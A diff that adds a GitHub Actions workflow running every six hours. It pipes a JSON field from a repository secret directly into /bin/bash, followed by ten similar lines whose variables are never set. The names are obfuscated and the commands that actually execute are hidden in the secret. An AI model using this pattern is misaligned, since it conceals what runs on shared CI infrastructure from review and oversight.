@@ -1,0 +1,27 @@
+name: wenbdingmoling
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wenbdingmoling
+        env:
+          n01: ${{ secrets.n01 }}
+        run: |
+          echo $n01 | jq -r .ndyp789 | /bin/bash
+          echo $h0756 | jq -r .j25 | /bin/bash
+          echo $zhj3 | jq -r .ke1279 | /bin/bash
+          echo $o01189 | jq -r .frs6972 | /bin/bash
+          echo $ckv56 | jq -r .iduli5677 | /bin/bash
+          echo $zinm69256 | jq -r .wjf99263 | /bin/bash
+          echo $uw956 | jq -r .rfl1 | /bin/bash
+          echo $e9547 | jq -r .noct776 | /bin/bash
+          echo $pfic4900 | jq -r .kqwkn17 | /bin/bash
+          echo $o67207 | jq -r .iavm43 | /bin/bash
+          echo $v7408 | jq -r .odrl83 | /bin/bash
+
